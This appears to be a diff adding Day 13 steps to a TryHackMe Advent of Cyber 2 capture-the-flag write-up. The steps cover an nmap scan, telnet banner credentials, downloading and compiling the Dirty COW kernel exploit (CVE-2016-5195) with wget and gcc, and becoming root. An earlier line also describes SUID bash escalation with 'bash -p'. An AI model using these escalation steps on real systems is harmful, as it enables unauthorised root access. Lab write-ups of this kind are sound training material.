@@ -89,3 +89,15 @@ Room Link: https://tryhackme.com/room/adventofcyber2
 5. Search for SUID in the GTFObin site for the bash binary - we can run the bash command like ‘bash -p’ in the provided shell to get the root access shell (bash shell with root access) - cat the flag.txt under /root/ directory
 
 ## Day 12 Solution Steps: typing ...
+
+## Day 13 Solution Steps: Coal for christmas 
+1. Nmap the target with command nmap <target IP> and it has 3 open ports in the first 1000. Where we have port 23 (telnet port) - not been used as it has been replaced by SSH 
+2. As the port telnet is open - we can grap the banner is they have any connect to the target IP using the telnet command as ‘telnet MACHINE_IP <PORT_FROM_NMAP_SCAN>’ - you will get the username and password to access the machine - connect to it either using the telnet or SSH
+3. After SSH'd into the machine use the command ‘cat /etc/lsb-release’ to get the machine OS version - ubuntu 12.04
+4. On the current directory cat the cookies_and_mike.txt and answer for the question - Grinch
+5. As we have older version of OS (current version is >20.0) we can do kernel exploit called ‘Dirty COW (CVE-2016-5195)’  - to get the exploit (.c) file wget the same using the cmd ‘wget https://github.com/FireFart/dirtycow/blob/master/dirty.c’ after getting the file complete the same as exeutble using gcc as follow ‘gcc -pthread dirty.c -o dirty -lcrypt’
+6. When you execute the exploit ‘./dirty’ you will be prompt for a password for the default user created ‘firefart’ provide the same and proceed further 
+7. After the exploit execution - switch to the firefart user using the cmd ‘su firefart’ - BOOM! You are root now - verify the same with cmd ‘id’
+8. Now on the same directory create a file ‘coal’ using the cmd ‘touch coal’ then type as follow ‘tree | md5sum > coal’ then ‘cat coal’ to get the hash for the final question of the day 
+
+## Day 14 Solution Steps: typing ...
